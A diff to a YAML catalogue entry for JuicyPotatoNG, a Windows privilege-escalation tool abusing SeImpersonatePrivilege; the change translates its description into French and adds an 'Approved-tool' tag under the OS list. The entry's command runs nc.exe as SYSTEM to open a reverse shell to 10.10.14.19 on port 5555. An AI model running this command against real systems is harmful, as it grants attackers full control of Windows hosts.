@@ -1,15 +1,15 @@
 ---
 description: |
-  Just another Windows Local Privilege Escalation from Service Account to System. Requires 'whoami /priv' SeImpersonatePrivilege. 
+  Encore une escalade des privilèges locaux de Windows d'un compte de service vers le système. Nécessite 'whoami /priv' SeImpersonatePrivilege.
 
   Command Reference:
-  ```
-  -t createprocess call: both (*)
 
-  -p <program>: nc.exe
+    -t createprocess call: both (*)
 
-  -a <argument>: 10.10.14.19 5555 -e cmd.exe
-  ```
+    -p <program>: nc.exe
+
+    -a <argument>: 10.10.14.19 5555 -e cmd.exe
+
 command: |
   JuicyPotatoNG.exe -t * -p "nc.exe" -a "10.10.14.19 5555 -e cmd.exe"
 
@@ -22,6 +22,7 @@ services:
   - 
 OS:
   - Windows
+  - Approved-tool
 attack_types:
   - PrivEsc
 references:
